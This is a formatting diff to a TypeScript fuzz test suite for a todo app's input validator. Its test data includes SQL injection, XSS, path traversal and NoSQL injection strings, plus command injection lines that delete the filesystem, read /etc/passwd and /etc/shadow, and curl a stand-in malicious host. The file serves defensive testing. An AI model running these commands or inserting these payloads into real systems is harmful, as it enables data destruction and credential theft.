@@ -11,7 +11,8 @@ describe('Input Validation Fuzzer', () => {
 
   // Helper functions to generate random inputs
   const generateRandomString = (length: number): string => {
-    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
+    const chars =
+      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
     let result = '';
     for (let i = 0; i < length; i++) {
       result += chars.charAt(Math.floor(Math.random() * chars.length));
@@ -24,51 +25,53 @@ describe('Input Validation Fuzzer', () => {
       // SQL Injection patterns
       "'; DROP TABLE todos; --",
       "1' OR '1'='1",
-      "UNION SELECT * FROM users--",
+      'UNION SELECT * FROM users--',
       "'; DELETE FROM todos WHERE '1'='1",
-      
+
       // XSS patterns
       "<script>alert('XSS')</script>",
       "<img src=x onerror=alert('XSS')>",
       "javascript:alert('XSS')",
-      "<iframe src='javascript:alert(\"XSS\")'></iframe>",
-      
+      '<iframe src=\'javascript:alert("XSS")\'></iframe>',
+
       // Command injection patterns
-      "; rm -rf /",
-      "| cat /etc/passwd",
-      "&& curl http://malicious.com",
-      "`whoami`",
-      "$(cat /etc/shadow)",
-      
+      '; rm -rf /',
+      '| cat /etc/passwd',
+      '&& curl http://malicious.com',
+      '`whoami`',
+      '$(cat /etc/shadow)',
+
       // Path traversal patterns
-      "../../../etc/passwd",
-      "..\\..\\..\\windows\\system32\\config\\sam",
-      "file:///etc/passwd",
-      "\\\\server\\share\\file",
-      
+      '../../../etc/passwd',
+      '..\\..\\..\\windows\\system32\\config\\sam',
+      'file:///etc/passwd',
+      '\\\\server\\share\\file',
+
       // Unicode/encoding attacks
-      "\u0000\u0001\u0002",
-      "\uFEFF",
-      "\u202E",
-      "%00",
-      "%0A%0D",
-      
+      '\u0000\u0001\u0002',
+      '\uFEFF',
+      '\u202E',
+      '%00',
+      '%0A%0D',
+
       // Format string attacks
-      "%s%s%s%s%s%s%s%s%s%s",
-      "%x%x%x%x%x%x%x%x",
-      "%n%n%n%n%n",
-      
+      '%s%s%s%s%s%s%s%s%s%s',
+      '%x%x%x%x%x%x%x%x',
+      '%n%n%n%n%n',
+
       // LDAP injection
-      "*)(&(objectClass=*",
-      ")(cn=*))",
-      
+      '*)(&(objectClass=*',
+      ')(cn=*))',
+
       // NoSQL injection
       "{'$ne': null}",
       "{'$gt': ''}",
       "{'$regex': '.*'}",
     ];
-    
-    return maliciousPatterns[Math.floor(Math.random() * maliciousPatterns.length)];
+
+    return maliciousPatterns[
+      Math.floor(Math.random() * maliciousPatterns.length)
+    ];
   };
 
   const generateRandomType = (): any => {
@@ -92,7 +95,7 @@ describe('Input Validation Fuzzer', () => {
       Symbol('test'),
       BigInt(9007199254740991),
     ];
-    
+
     return types[Math.floor(Math.random() * types.length)];
   };
 
@@ -100,7 +103,7 @@ describe('Input Validation Fuzzer', () => {
     const patterns = [
       // Extremely long strings
       'A'.repeat(10000),
-      
+
       // Empty and whitespace
       '',
       ' ',
@@ -108,7 +111,7 @@ describe('Input Validation Fuzzer', () => {
       '\n',
       '\r\n',
       '   \t\n\r   ',
-      
+
       // Special characters
       '🚀🌟✨',
       '中文字符',
@@ -116,17 +119,17 @@ describe('Input Validation Fuzzer', () => {
       'ñáéíóú',
       '\u0000',
       '\uFFFF',
-      
+
       // Control characters
       '\x00\x01\x02\x03',
       '\b\t\n\v\f\r',
-      
+
       // Mixed patterns
       'normal' + '\x00' + 'text',
       'test\nwith\nnewlines',
       'tabs\there\tand\tthere',
     ];
-    
+
     return patterns[Math.floor(Math.random() * patterns.length)];
   };
 
@@ -135,7 +138,7 @@ describe('Input Validation Fuzzer', () => {
       for (let i = 0; i < iterations; i++) {
         const length = Math.floor(Math.random() * 1000);
         const input = generateRandomString(length);
-        
+
         try {
           const result = validator.validateTodoInput(input);
           // Valid inputs should be sanitized
@@ -154,7 +157,7 @@ describe('Input Validation Fuzzer', () => {
     it('should handle malicious inputs', () => {
       for (let i = 0; i < iterations; i++) {
         const input = generateMaliciousString();
-        
+
         try {
           const result = validator.validateTodoInput(input);
           // If it passes, ensure dangerous content is sanitized
@@ -174,7 +177,7 @@ describe('Input Validation Fuzzer', () => {
     it('should handle extreme edge cases', () => {
       for (let i = 0; i < iterations; i++) {
         const input = generateExtremeString();
-        
+
         try {
           const result = validator.validateTodoInput(input);
           expect(result).toBeDefined();
@@ -192,9 +195,11 @@ describe('Input Validation Fuzzer', () => {
     it('should handle various invalid types', () => {
       for (let i = 0; i < iterations; i++) {
         const input = generateRandomType();
-        
+
         if (typeof input !== 'string') {
-          expect(() => validator.validateTodoInput(input)).toThrow(ValidationError);
+          expect(() => validator.validateTodoInput(input)).toThrow(
+            ValidationError
+          );
         }
       }
     });
@@ -203,10 +208,12 @@ describe('Input Validation Fuzzer', () => {
   describe('validateApiKey', () => {
     it('should handle random API key formats', () => {
       for (let i = 0; i < iterations; i++) {
-        const prefix = ['xai-', 'sk-', 'api-', ''][Math.floor(Math.random() * 4)];
+        const prefix = ['xai-', 'sk-', 'api-', ''][
+          Math.floor(Math.random() * 4)
+        ];
         const length = Math.floor(Math.random() * 100);
         const key = prefix + generateRandomString(length);
-        
+
         try {
           const result = validator.validateApiKey(key);
           expect(result).toBeDefined();
@@ -222,8 +229,10 @@ describe('Input Validation Fuzzer', () => {
     it('should reject malicious API keys', () => {
       for (let i = 0; i < iterations; i++) {
         const maliciousKey = 'xai-' + generateMaliciousString();
-        
-        expect(() => validator.validateApiKey(maliciousKey)).toThrow(ValidationError);
+
+        expect(() => validator.validateApiKey(maliciousKey)).toThrow(
+          ValidationError
+        );
       }
     });
   });
@@ -232,18 +241,20 @@ describe('Input Validation Fuzzer', () => {
     it('should handle random file paths', () => {
       const extensions = ['.txt', '.json', '.md', '.log', '.tmp', ''];
       const separators = ['/', '\\', '//', '\\\\'];
-      
+
       for (let i = 0; i < iterations; i++) {
         const depth = Math.floor(Math.random() * 10);
-        const separator = separators[Math.floor(Math.random() * separators.length)];
-        const extension = extensions[Math.floor(Math.random() * extensions.length)];
-        
+        const separator =
+          separators[Math.floor(Math.random() * separators.length)];
+        const extension =
+          extensions[Math.floor(Math.random() * extensions.length)];
+
         let path = '';
         for (let j = 0; j < depth; j++) {
           path += generateRandomString(10) + separator;
         }
         path += generateRandomString(10) + extension;
-        
+
         try {
           const result = validator.validateFilePath(path);
           expect(result).toBeDefined();
@@ -267,9 +278,11 @@ describe('Input Validation Fuzzer', () => {
         'file:///etc/passwd',
         '\\\\server\\share\\..\\admin$',
       ];
-      
+
       for (const pattern of traversalPatterns) {
-        expect(() => validator.validateFilePath(pattern)).toThrow(ValidationError);
+        expect(() => validator.validateFilePath(pattern)).toThrow(
+          ValidationError
+        );
       }
     });
   });
@@ -278,13 +291,14 @@ describe('Input Validation Fuzzer', () => {
     it('should handle random search queries', () => {
       for (let i = 0; i < iterations; i++) {
         const query = generateRandomString(Math.floor(Math.random() * 200));
-        
+
         try {
           const result = validator.validateSearchQuery(query);
           expect(result).toBeDefined();
           expect(typeof result).toBe('string');
           // Should sanitize special regex characters
-          const hasSpecialChars = query.includes('*') || query.includes('?') || query.includes('[');
+          const hasSpecialChars =
+            query.includes('*') || query.includes('?') || query.includes('[');
           if (hasSpecialChars) {
             expect(result).not.toMatch(/[*?[\]]/);
           }
@@ -305,7 +319,7 @@ describe('Input Validation Fuzzer', () => {
         '\\w+',
         '(?=.*[a-z])(?=.*[A-Z])',
       ];
-      
+
       for (const pattern of regexPatterns) {
         const result = validator.validateSearchQuery(pattern);
         // Should escape regex special characters
@@ -320,7 +334,7 @@ describe('Input Validation Fuzzer', () => {
     it('should handle random numeric inputs', () => {
       for (let i = 0; i < iterations; i++) {
         const value = Math.random() * 10000 - 5000; // Random between -5000 and 5000
-        
+
         try {
           const result = validator.validateBatchSize(value);
           expect(result).toBeGreaterThan(0);
@@ -345,9 +359,11 @@ describe('Input Validation Fuzzer', () => {
         true,
         false,
       ];
-      
+
       for (const value of invalidValues) {
-        expect(() => validator.validateBatchSize(value as any)).toThrow(ValidationError);
+        expect(() => validator.validateBatchSize(value as any)).toThrow(
+          ValidationError
+        );
       }
     });
   });
@@ -356,14 +372,15 @@ describe('Input Validation Fuzzer', () => {
     it('should handle random URL-like strings', () => {
       const protocols = ['http://', 'https://', 'ftp://', 'file://', ''];
       const tlds = ['.com', '.org', '.net', '.edu', '.invalid', ''];
-      
+
       for (let i = 0; i < iterations; i++) {
-        const protocol = protocols[Math.floor(Math.random() * protocols.length)];
+        const protocol =
+          protocols[Math.floor(Math.random() * protocols.length)];
         const domain = generateRandomString(10);
         const tld = tlds[Math.floor(Math.random() * tlds.length)];
         const path = '/' + generateRandomString(20);
         const url = protocol + domain + tld + path;
-        
+
         try {
           const result = validator.validateUrl(url);
           expect(result).toBeDefined();
@@ -387,7 +404,7 @@ describe('Input Validation Fuzzer', () => {
         'https://evil.com/<script>',
         'http://localhost:22/ssh',
       ];
-      
+
       for (const url of maliciousUrls) {
         expect(() => validator.validateUrl(url)).toThrow(ValidationError);
       }
@@ -397,35 +414,41 @@ describe('Input Validation Fuzzer', () => {
   describe('concurrent validation stress test', () => {
     it('should handle multiple validations concurrently', async () => {
       const validations = [];
-      
+
       for (let i = 0; i < 100; i++) {
         // Create different types of validations
         validations.push(
-          Promise.resolve().then(() => 
-            validator.validateTodoInput(generateRandomString(100))
-          ).catch(() => null),
-          
-          Promise.resolve().then(() => 
-            validator.validateApiKey('xai-' + generateRandomString(40))
-          ).catch(() => null),
-          
-          Promise.resolve().then(() => 
-            validator.validateFilePath('/tmp/' + generateRandomString(20))
-          ).catch(() => null),
-          
-          Promise.resolve().then(() => 
-            validator.validateSearchQuery(generateRandomString(50))
-          ).catch(() => null),
-          
-          Promise.resolve().then(() => 
-            validator.validateBatchSize(Math.floor(Math.random() * 100))
-          ).catch(() => null)
+          Promise.resolve()
+            .then(() => validator.validateTodoInput(generateRandomString(100)))
+            .catch(() => null),
+
+          Promise.resolve()
+            .then(() =>
+              validator.validateApiKey('xai-' + generateRandomString(40))
+            )
+            .catch(() => null),
+
+          Promise.resolve()
+            .then(() =>
+              validator.validateFilePath('/tmp/' + generateRandomString(20))
+            )
+            .catch(() => null),
+
+          Promise.resolve()
+            .then(() => validator.validateSearchQuery(generateRandomString(50)))
+            .catch(() => null),
+
+          Promise.resolve()
+            .then(() =>
+              validator.validateBatchSize(Math.floor(Math.random() * 100))
+            )
+            .catch(() => null)
         );
       }
-      
+
       // Run all validations concurrently
       const results = await Promise.all(validations);
-      
+
       // Should complete without crashing
       expect(results).toHaveLength(500);
     });
